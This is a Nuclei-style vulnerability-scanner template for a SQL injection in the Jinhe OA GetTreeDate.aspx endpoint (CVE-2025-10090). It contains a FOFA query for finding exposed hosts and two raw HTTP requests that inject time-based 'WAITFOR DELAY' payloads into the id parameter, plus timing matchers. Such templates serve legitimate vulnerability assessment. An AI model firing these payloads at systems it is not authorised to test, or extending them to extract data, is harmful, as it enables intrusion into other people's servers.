id: jinhe-oa-gettreedate-sqli
info:
  name: "金和OA系统GetTreeDate.aspx接口SQL注入"
  author: 0dayPoc
  severity: high
  description: |-
    fofa: app="金和网络-金和OA"
          /C6/Jhsoft.Web.departments/GetTreeDate.aspx接口在处理id参数时，未经过严格验证和参数化处理，直接拼接至SQL查询语句中，导致攻击者可通过构造恶意输入执行任意SQL命令
  reference:
  - CVE-2025-10090
  tags: 金和OA
http:
- raw:
  - |
    GET /C6/Jhsoft.Web.departments/GetTreeDate.aspx/?id=1;WAITFOR+DELAY+'0:0:5'-- HTTP/1.1
    Host: {{Hostname}}
    Connection: close
  - |
    GET /C6/Jhsoft.Web.departments/GetTreeDate.aspx/?id=1;WAITFOR+DELAY+'0:0:8'-- HTTP/1.1
    Host: {{Hostname}}
    Connection: close
  matchers:
  - type: dsl
    dsl:
    - duration_1>=5 && duration_1<=6
    - duration_2>=8 && duration_2<=9
    condition: and
